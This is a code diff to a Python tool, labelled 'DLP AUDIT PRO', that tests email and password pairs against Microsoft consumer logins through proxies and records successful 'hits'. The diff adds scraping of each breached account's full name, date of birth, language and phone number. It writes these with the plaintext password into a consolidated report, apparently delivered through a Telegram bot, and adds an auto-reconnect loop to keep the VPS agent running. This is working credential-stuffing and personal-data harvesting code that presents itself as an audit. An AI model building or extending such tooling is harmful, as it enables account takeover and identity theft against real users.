@@ -261,6 +261,7 @@ def run_local_audit(email, password, proxy_dict, hits_buffer):
             # ¡HITS POSITIVO!
             profile_res = session.get("https://login.microsoftonline.com/consumers/profile/v1.0/me", verify=False, timeout=15)
             country = "XZ"
+            name, dob, language, phone = "N/A", "N/A", "N/A", "N/A"
             if profile_res.status_code == 200:
                 try:
                     p_data = profile_res.json()
@@ -271,19 +272,34 @@ def run_local_audit(email, password, proxy_dict, hits_buffer):
                     pass
             
             # TLD Fallback Extremo para forzar País
-            if country == "XZ":
-                try:
-                    profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
-                    if profile_html_res.status_code == 200:
-                        html_text = profile_html_res.text
-                        country_match = re.search(r'"Country"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                        if not country_match:
-                            country_match = re.search(r'"CountryOrRegion"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                        if country_match:
-                            raw_country = country_match.group(1)
-                            country = raw_country[:4].upper() if len(raw_country) > 2 else raw_country.upper()
-                except:
-                    pass
+            try:
+                profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
+                if profile_html_res.status_code == 200:
+                    html_text = profile_html_res.text
+                    
+                    if name == "N/A" or not name:
+                        m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                        if not m: m = re.search(r'<span>Full name</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
+                        if m: name = m.group(1).strip()
+                    
+                    m = re.search(r'"(?:Country|CountryOrRegion)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                    if not m: m = re.search(r'Country or region</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
+                    if m: country = m.group(1).strip().upper()
+                        
+                    m = re.search(r'"(?:BirthDate|DateOfBirth|dob)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                    if not m: m = re.search(r'Date of birth</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
+                    if m: dob = m.group(1).strip()
+                            
+                    m = re.search(r'"(?:Language|Locale)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                    if not m: m = re.search(r'id="locale-picker-link"[^>]*>([^<]+)</a>', html_text, re.IGNORECASE)
+                    if m: language = m.group(1).strip()
+
+                    phone_matches = re.findall(r'"ProofName"\s*:\s*"(\+\d+[^"]+)"', html_text, re.IGNORECASE)
+                    if not phone_matches: phone_matches = re.findall(r'"PhoneNumber"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                    if not phone_matches: phone_matches = re.findall(r'Phone\s*(?:linked\s*to)?[^<]*\s*(\+\d[\d\s]+)\s*<', html_text, re.IGNORECASE | re.DOTALL)
+                    if phone_matches: phone = phone_matches[0].strip()
+            except:
+                pass
 
             if country == "XZ":
                 email_lower = email.lower()
@@ -314,6 +330,10 @@ def run_local_audit(email, password, proxy_dict, hits_buffer):
                 "match": "HOTMAIL HQ",
                 "total": 1,
                 "country": country,
+                "name": name,
+                "dob": dob,
+                "language": language,
+                "phone": phone,
                 "chat_id": "" # Se poblará después en base a los usuarios activos
             })
     except Exception as e:
@@ -455,13 +475,12 @@ def send_consolidated_report(hits):
         with open(report_path, "w", encoding="utf-8") as f:
             f.write("DLP AUDIT PRO - REPORTE VPS\n")
             f.write("="*40 + "\n\n")
-            f.write(f"{'CORREO':<30} | {'CONTRASEÑA':<15} | {'HITS':<6} | {'PAÍS':<4} | {'OBJETIVO'}\n")
-            f.write("-" * 80 + "\n")
             for cat, items in categories.items():
                 for h in items:
-                    pwd = h['pass']
-                    if len(pwd) > 15: pwd = pwd[:12] + "..."
-                    f.write(f"{h['email']:<30} | {pwd:<15} | {str(h['total']):<6} | {h['country'][:4]:<4} | [{h['match']}]\n")
+                    f.write(f"EMAIL: {h['email']} | PASS: {h['pass']}\n")
+                    f.write(f"PAIS: {h['country']} | NOMBRE: {h.get('name', 'N/A')}\n")
+                    f.write(f"DOB: {h.get('dob', 'N/A')} | TELEFONO: {h.get('phone', 'N/A')}\n")
+                    f.write("-" * 50 + "\n")
             f.write("\n")
 
         try:
@@ -555,7 +574,13 @@ async def main():
     await client.run_until_disconnected()
 
 if __name__ == '__main__':
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\nSaliendo del Agente VPS...")
+    while True:
+        try:
+            asyncio.run(main())
+        except KeyboardInterrupt:
+            print("\nSaliendo del Agente VPS...")
+            break
+        except Exception as e:
+            print(f"\n❌ Error fatal o agente desconectado: {e}")
+            print("⏳ Reintentando conexión en 15 segundos para mantener el VPS en línea...")
+            time.sleep(15)
